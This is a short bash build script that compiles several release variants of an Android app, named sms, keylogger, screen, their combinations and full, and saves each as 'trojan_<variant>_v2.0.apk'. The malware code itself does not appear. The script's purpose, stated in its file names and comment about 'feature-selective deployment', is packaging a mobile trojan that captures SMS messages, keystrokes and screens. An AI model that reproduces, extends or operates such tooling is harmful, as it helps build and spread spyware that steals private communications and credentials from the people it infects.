#!/bin/bash
# Build all APK variants for feature-selective deployment

echo "Building all APK variants..."
echo "=============================="

cd "$(dirname "$0")/mobile"

# Clean previous builds
echo "Cleaning previous builds..."
./gradlew clean

# Build all variants
echo ""
echo "Building variants..."
echo "--------------------"

variants=("sms" "keylogger" "screen" "smsKeylogger" "smsScreen" "keyloggerScreen" "full")

for variant in "${variants[@]}"; do
    echo ""
    echo "Building ${variant}..."
    
    # Capitalize first letter for Gradle task name
    variantCap="$(tr '[:lower:]' '[:upper:]' <<< ${variant:0:1})${variant:1}"
    ./gradlew assemble${variantCap}Release
    
    if [ $? -eq 0 ]; then
        echo "✓ ${variant} build successful"
        
        # Copy to output directory
        mkdir -p ../output
        cp "app/build/outputs/apk/${variant}/release/app-${variant}-release.apk" "../output/trojan_${variant}_v2.0.apk"
        echo "✓ Copied to output/trojan_${variant}_v2.0.apk"
    else
        echo "✗ ${variant} build failed"
    fi
done

echo ""
echo "=============================="
echo "Build complete!"
echo "APKs available in output/ directory"
